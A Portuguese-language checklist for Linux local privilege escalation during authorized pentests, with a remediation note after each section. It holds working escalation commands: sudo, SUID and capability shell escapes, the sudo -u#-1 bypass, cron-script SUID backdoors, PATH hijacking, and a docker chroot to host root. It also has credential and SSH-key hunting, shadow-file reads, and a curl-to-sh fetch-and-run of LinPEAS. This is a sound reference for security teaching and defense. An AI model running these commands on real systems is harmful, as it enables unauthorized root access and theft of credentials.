# Privilege Escalation Local — Linux

> Checklist de bolso para escalonamento de privilégios em hosts Linux durante engajamentos autorizados.

## Uso autorizado

Execute estas técnicas APENAS em sistemas dentro do escopo formal do engajamento, com autorização por escrito (Rules of Engagement). Enumeração automatizada (LinPEAS) e PoCs podem alterar estado do sistema, gerar logs e disparar EDR — registre tudo (timestamp, host, comando) para a trilha de auditoria e o relatório.

---

## 0. Triagem inicial (situational awareness)

```bash
id; whoami; groups          # contexto atual, grupos privilegiados (sudo, docker, lxd, disk, adm)
uname -a; cat /etc/os-release  # kernel e distro/versão
hostname; ip a; cat /etc/hosts
sudo -l                     # o que o usuário pode rodar via sudo (sem/com senha)
cat /etc/passwd | grep -v nologin   # contas com shell
ps aux --forest             # processos rodando como root
env; cat ~/.bashrc ~/.profile 2>/dev/null   # variáveis, segredos, PATH
```

Grupos de alto valor: `sudo`, `wheel`, `docker`, `lxd`/`lxc`, `disk`, `adm`, `shadow`, `video`.

---

## 1. sudo

- [ ] `sudo -l` — binários permitidos, `NOPASSWD`, `SETENV`, `env_keep`.
- [ ] Binários em `sudo -l` que permitem fuga de shell (consultar GTFOBins).
- [ ] Versão do sudo vulnerável (`sudo --version`) — ex.: CVE-2021-3156 (Baron Samedit, heap overflow), CVE-2019-14287 (`-u#-1`), CVE-2023-22809 (`sudoedit` via `EDITOR`).
- [ ] `LD_PRELOAD`/`LD_LIBRARY_PATH` preservados via `env_keep`.
- [ ] Wildcards perigosos em comandos sudo (ex.: `tar`, `rsync`, `*`).

```bash
sudo -l
sudo --version
# GTFOBins (exemplos): se sudo permite
sudo find . -exec /bin/sh \; -quit
sudo vim -c ':!/bin/sh'
sudo less /etc/profile   # !/bin/sh
sudo awk 'BEGIN {system("/bin/sh")}'
sudo env /bin/sh
# CVE-2019-14287 (sudo < 1.8.28, runas ALL):
sudo -u#-1 /bin/bash
# env_keep com LD_PRELOAD:
sudo LD_PRELOAD=/tmp/x.so <comando_permitido>
```

**Remediação:** princípio do menor privilégio no `/etc/sudoers`; evite `NOPASSWD` e `ALL`; nunca permita editores/intérpretes/`find`/`tar` via sudo sem `restrict`; remova `env_keep` para `LD_*`; mantenha o pacote `sudo` atualizado.

---

## 2. SUID / SGID

- [ ] Listar binários SUID/SGID e cruzar com GTFOBins.
- [ ] Binários customizados/incomuns com SUID.
- [ ] Binários que chamam outros sem path absoluto (PATH hijack).

```bash
find / -perm -4000 -type f 2>/dev/null          # SUID
find / -perm -2000 -type f 2>/dev/null          # SGID
find / -perm -u=s -type f 2>/dev/null -ls       # com detalhes
# Exemplos GTFOBins (SUID set):
./find . -exec /bin/sh -p \; -quit
./bash -p
nmap --interactive   # versões antigas: !sh
cp /etc/shadow /tmp/  # se cp tem SUID
```

**Remediação:** remova SUID/SGID desnecessário (`chmod u-s`); audite binários customizados; prefira `capabilities` granulares a SUID; monte partições de dados com `nosuid`.

---

## 3. Linux capabilities

- [ ] Enumerar capabilities setadas em binários.
- [ ] `cap_setuid`, `cap_setgid`, `cap_dac_read_search`, `cap_dac_override`, `cap_sys_admin`, `cap_sys_ptrace`.

```bash
getcap -r / 2>/dev/null
# Exemplos de abuso:
# python com cap_setuid+ep:
./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
# perl com cap_setuid:
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# cap_dac_read_search → ler /etc/shadow:
./tar cvf shadow.tar /etc/shadow
```

**Remediação:** `setcap -r <bin>` para remover capabilities indevidas; conceda a menor capability necessária; nunca atribua `cap_setuid`/`cap_sys_admin` a intérpretes.

---

## 4. Cron jobs e timers

- [ ] Crontabs do sistema e de usuários.
- [ ] Scripts chamados por cron com permissão de escrita ou em diretório gravável.
- [ ] Wildcards em comandos cron (ex.: `tar *`, `rsync`).
- [ ] `PATH` relativo dentro de scripts cron rodando como root.
- [ ] systemd timers.

```bash
cat /etc/crontab; ls -la /etc/cron.* /etc/cron.d/
crontab -l; ls -la /var/spool/cron/crontabs/ 2>/dev/null
systemctl list-timers --all
# Monitorar processos para flagrar jobs (pspy é ideal):
# ./pspy64 -pf -i 1000
# Se o script cron é gravável:
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/script.sh
```

**Remediação:** scripts de cron com dono `root:root` e `chmod 700`; nunca use diretórios graváveis no path do job; evite wildcards; defina `PATH` absoluto no topo do crontab.

---

## 5. PATH hijacking & escrita em binários

- [ ] PATH inclui `.` ou diretórios graváveis antes dos confiáveis.
- [ ] Binários/scripts root que chamam comandos sem caminho absoluto.
- [ ] Arquivos/diretórios world-writable em locais executados por root.

```bash
echo $PATH
find / -writable -type d 2>/dev/null            # dirs graváveis
find / -perm -222 -type f 2>/dev/null           # files world-writable
find / -writable ! -user `whoami` 2>/dev/null
# Hijack: se script root roda `service` sem path e /tmp está no PATH:
cd /tmp; echo '/bin/bash -p' > service; chmod +x service; export PATH=/tmp:$PATH
```

**Remediação:** sempre use caminhos absolutos em scripts privilegiados; remova `.` e dirs graváveis do PATH; corrija permissões world-writable.

---

## 6. Kernel exploits

- [ ] Versão do kernel vs. exploits conhecidos.
- [ ] Use exploit de kernel como ÚLTIMO recurso (risco de crash/instabilidade) e somente com autorização explícita.

```bash
uname -r; cat /proc/version
# Avaliação (não automatize exploit em produção):
# linux-exploit-suggester.sh (les)
# Exemplos históricos (só identificação): DirtyCOW (CVE-2016-5195),
# DirtyPipe (CVE-2022-0847), OverlayFS (CVE-2021-3493 / CVE-2023-0386),
# PwnKit/pkexec (CVE-2021-4034), Looney Tunables (CVE-2023-4911).
```

```bash
# PwnKit (pkexec) — verificar presença e versão do polkit:
ls -la /usr/bin/pkexec; pkexec --version
```

**Remediação:** mantenha kernel e pacotes (polkit, glibc) atualizados; aplique livepatch quando disponível; habilite `kernel.unprivileged_userns_clone=0` quando viável.

---

## 7. Vetores adicionais (verificar)

```bash
# NFS no_root_squash:
cat /etc/exports   # procurar no_root_squash → criar SUID via montagem remota
# Docker/LXD group → root no host:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# Credenciais e chaves:
grep -RiE 'password|passwd|secret|api[_-]?key' /etc /home /var/www 2>/dev/null
find / -name 'id_rsa*' -o -name '*.pem' 2>/dev/null
cat ~/.bash_history ~/.mysql_history 2>/dev/null
# Capacidades de leitura de /etc/shadow e arquivos de backup:
ls -la /etc/shadow /etc/passwd; find / -name '*.bak' 2>/dev/null
```

---

## 8. Ferramentas de enumeração

```bash
# LinPEAS (abrangente, colorido por níveis 95%/RED+YELLOW = quick win):
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
./linpeas.sh -a            # all checks
./linpeas.sh -e            # extra/lento
# LinEnum:
./LinEnum.sh -t            # thorough
# linux-smart-enumeration:
./lse.sh -l1               # nível de verbosidade
# pspy — observa processos/cron sem root:
./pspy64 -pf -i 1000
# linux-exploit-suggester:
./linux-exploit-suggester.sh
```

> Dica de leitura do LinPEAS: priorize itens marcados em VERMELHO/AMARELHO (99% probabilidade de vetor). Confirme manualmente antes de explorar.

---

## 9. Referências rápidas

- GTFOBins — https://gtfobins.github.io (sudo/SUID/capabilities escape)
- PEASS-ng (LinPEAS) — https://github.com/peass-ng/PEASS-ng
- HackTricks — Linux Privilege Escalation
